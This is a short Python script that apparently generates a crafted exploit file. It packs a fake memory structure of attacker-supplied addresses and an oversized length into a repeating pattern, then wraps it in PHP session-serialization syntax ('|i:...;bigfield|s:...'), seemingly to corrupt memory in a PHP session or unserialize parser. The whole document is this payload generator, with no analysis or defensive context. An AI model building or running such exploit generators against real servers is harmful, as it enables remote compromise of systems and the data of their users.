#!/usr/bin/env python3
import struct, sys, os
P=int(sys.argv[2],0); B0=int(sys.argv[3],0); keylen=int(sys.argv[4]); L=int(sys.argv[5]); out=sys.argv[1]; K=int(sys.argv[6],0) if len(sys.argv)>6 else 0
period=256
pat=bytearray(b'A'*period)
def put(off,b):
    for i,x in enumerate(b):
        pat[(off+i)%period]=x
# struct at pattern offset 0xE8
st=struct.pack('<QQQQQQQQ', P+56, B0, B0, 0,0,0, 0x7fffffff, 1018)+struct.pack('<Q',0)
put(0xE8, st)
# B0 field at pattern offset (B0-P)%period
put((B0-P)%period, struct.pack('<q',K)+struct.pack('<Q',0))
key=(bytes(pat)*(keylen//period+2))[:keylen]
head=(key+b'|i:10731636;'+b'bigfield|s:'+str(L).encode()+b':"')
data=head+b'V'*L+b'";'
open(out,'wb').write(data)
print('file',out,'size',len(data),'keylen',keylen,'L',L,'K',K,'P',hex(P),'B0',hex(B0),'pat7c',any(x==0x7c for x in pat))
# check 0x7c in key
print('key7c', b'|' in key)
